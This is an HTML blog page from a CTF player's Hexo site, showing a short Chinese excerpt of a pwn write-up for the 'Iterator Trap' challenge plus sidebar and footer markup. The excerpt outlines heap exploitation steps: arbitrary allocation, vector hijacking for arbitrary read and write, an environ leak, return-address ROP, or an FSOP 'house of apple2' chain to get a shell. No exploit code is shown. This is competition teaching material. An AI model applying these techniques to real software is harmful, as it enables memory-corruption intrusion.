<p>gift 通过sbrk 给了堆地址，就不用泄露堆地址，然后这个edit其实可以当show来用，实现出任意地址申请后，可以申请到堆上vector成员的位置，再配合edit，就可以实现多次任意地址写，泄露出environ后，用任意地址写去写子函数的返回地址打rop去getshell</p>
<p>或者是打fsop house of apple2的利用链，只需要泄露libc还有实现一次任意地址写，之后伪造iofile，宽字符的虚表后就可以getshell</p>
<p>劫持vector 把任意地址申请增强 转换成可以用很简单的方式实现任意地址读写的做法</p>
<p>exp</p>
	
	</div>
  <a type="button" href="/2024/08/31/nss3rd出题-Iterator-Trap解题思路/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/ctf/">ctf<span>52</span></a></li>
		
			<li><a href="/categories/misc/">misc<span>9</span></a></li>
		
			<li><a href="/categories/os/">os<span>2</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/dev/">dev<span>2</span></a></li>
		
			<li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
		
			<li><a href="/tags/misc/">misc<span>9</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2025/05/03/rust入门-数据所有权与生命周期管理/" ><i class="fa fa-file-o"></i>rust入门_数据所有权与生命周期管理</a>
      </li>
    
      <li>
        <a href="/2025/04/29/hackergame2024复现/" ><i class="fa fa-file-o"></i>hackergame2024复现</a>
      </li>
    
      <li>
        <a href="/2025/04/09/Squ1rrelCTF/" ><i class="fa fa-file-o"></i>Squ1rrelCTF</a>
      </li>
    
      <li>
        <a href="/2025/01/27/x3ctf/" ><i class="fa fa-file-o"></i>x3ctf</a>
      </li>
    
      <li>
        <a href="/2025/01/27/KnightCTF/" ><i class="fa fa-file-o"></i>KnightCTF</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://blog.yuro.work/" title="" target="_blank"]);">yuro</a></li>
	
		<li><i class="false"></i><a href="https://shinichicun.top/" title="" target="_blank"]);">shin</a></li>
	
		<li><i class="false"></i><a href="https://k0rian.github.io/" title="" target="_blank"]);">k0rain</a></li>
	
		<li><i class="false"></i><a href="https://tokameine.top/" title="" target="_blank"]);">TokameinE</a></li>
	
		<li><i class="false"></i><a href="https://blog.xinshi.fun/" title="" target="_blank"]);">LilRan</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
